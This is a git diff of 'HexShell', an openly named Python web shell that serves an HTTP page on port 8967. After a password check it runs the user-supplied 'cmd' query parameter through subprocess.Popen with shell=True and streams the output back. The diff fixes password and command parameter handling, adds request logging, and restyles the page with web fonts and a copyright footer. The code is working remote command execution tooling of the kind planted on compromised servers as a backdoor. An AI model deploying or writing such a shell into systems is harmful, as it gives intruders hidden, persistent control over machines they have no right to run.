@@ -54,8 +54,8 @@ class Webshell(BaseHTTPRequestHandler):
             self.wfile.write(b'Please specify the command and the password')
             return
         with open("hexshell.access.log", "a+") as f:
-            f.write(str(query["pw"] == PASSWORD)+" "+json.dumps(query))
-        if query["pw"] != PASSWORD:
+            f.write(str(query["pw"][0] == PASSWORD)+" "+json.dumps(query)+"\n")
+        if query["pw"][0] != PASSWORD:
             self.send_response(403)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
@@ -66,12 +66,17 @@ class Webshell(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b'<!DOCTYPE html><html><head><title>HexShell</title>')
         self.wfile.write(b'<link rel="shortcut icon" href="https://github.com/Falcn8/HexShell/blob/master/HexShell.jpg?raw=true"/>')
-        self.wfile.write(b'<link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">')
-        self.wfile.write(b'<style>@font-face {font-family:Inder;src:url("https://raw.githubusercontent.com/Falcn8/hexshell/master/Inder-Regular.ttf");}</style>')
-        self.wfile.write(b'</head><body class="bg-gray-100">')
-        self.wfile.write(b'<div class="bg-white p-6 rounded-lg shadow-md mx-auto my-10 max-w-screen-md overflow-auto">')
+        self.wfile.write(b'<link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet"><style>')
+        self.wfile.write(b'@font-face {font-family:Aquire;src:url("https://raw.githubusercontent.com/Falcn8/hexshell/master/Aquire-BW0ox.otf") format("opentype");}')
+        self.wfile.write(b'@font-face {font-family:Inder;src:url("https://raw.githubusercontent.com/Falcn8/hexshell/master/Inder-Regular.ttf");}')
+        self.wfile.write(b'h1, h3 {font-family: Aquire !important;}')
+        self.wfile.write(b'body {font-family: Inder;}')
+        self.wfile.write(b'</style></head><body class="bg-gray-100">')
+        self.wfile.write(b'<h1 class="text-3xl font-medium text-center mx-auto mt-10"><a href="/">HexShell</a></h1>')
+        self.wfile.write(b'<h3 class="text-lg font-normal text-center mx-auto">'+platform.platform().encode())
+        self.wfile.write(b'</h3><div class="bg-white p-6 rounded-lg shadow-md mx-auto my-10 max-w-screen-md overflow-auto">')
         self.wfile.write(b'<pre class="text-gray-700">')
-        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(query["cmd"][0], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         while True:
             output = process.stdout.readline().decode()
             if output == '' and process.poll() is not None:
@@ -79,7 +84,7 @@ class Webshell(BaseHTTPRequestHandler):
             if output:
                 self.wfile.write(bytes(output, "utf8"))
                 self.wfile.flush()
-        self.wfile.write(b'</pre></div></body></html>')
+        self.wfile.write(b'</pre></div><p class="text-center text-gray-700 text-xs py-2">&#169; Copyright by <a href="https://github.com/Falcn8" class="text-green-500 hover:underline">hexagon</a></p></body></html>')
 
 httpd = HTTPServer(('', 8967), Webshell)
 print("Serving on port 8967\n")
